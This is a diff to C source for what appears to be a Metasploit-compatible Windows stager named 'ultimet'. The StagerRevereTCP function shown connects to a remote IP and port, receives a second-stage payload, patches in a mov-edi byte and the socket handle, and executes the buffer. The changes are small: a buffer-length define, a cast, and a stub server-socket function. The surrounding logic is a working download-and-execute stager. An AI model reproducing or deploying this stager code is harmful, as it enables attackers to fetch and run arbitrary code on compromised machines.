@@ -6,6 +6,8 @@ Steps are as follows:
 3- Return socket on success, INVALID_SOCKET otherwise...
 */
 
+#define DEFAULT_BUFLEN 512
+
 SOCKET get_socket(wchar_t* IP, wchar_t* iPort)  // MSDN http://msdn.microsoft.com/en-us/library/windows/desktop/ms737591(v=vs.85).aspx
 {
 	WSADATA wsaData;
@@ -61,7 +63,6 @@ SOCKET get_socket(wchar_t* IP, wchar_t* iPort)  // MSDN http://msdn.microsoft.co
 	return SocketToHandler;
 } 
 
-
 void StagerRevereTCP(wchar_t* IP, wchar_t* iPort)
 {
 	SOCKET sckt;
@@ -98,7 +99,7 @@ void StagerRevereTCP(wchar_t* IP, wchar_t* iPort)
 	// Getting the stage
 	recv(sckt, buff + 5, len, MSG_WAITALL); // not specifying MSG_WAITALL caused me two days of headache ...
 	dprintf(L"[*] Setting EDI-to-be value:  0x%08x -> 0xBF\n", &buff);
-	buff[0] = 0xBF;
+	buff[0] = (char)0xBF;
 	dprintf(L"[*] Copying the socket address to the next 4 bytes...\n");
 	memcpy(buff+1, &sckt, 4);
 	dprintf(L"[*] Detaching from console & calling the function, bye bye [ultimet], hello metasploit!\n");
@@ -110,7 +111,8 @@ void StagerBindTCP(wchar_t* IP, wchar_t* iPort)
 {
 
 };
-void StagerBindTCPSSL(wchar_t* IP, wchar_t* iPort)
-{
 
+SOCKET get_server_socket(wchar_t* IP, wchar_t* iPort)
+{
+  return INVALID_SOCKET;   
 };
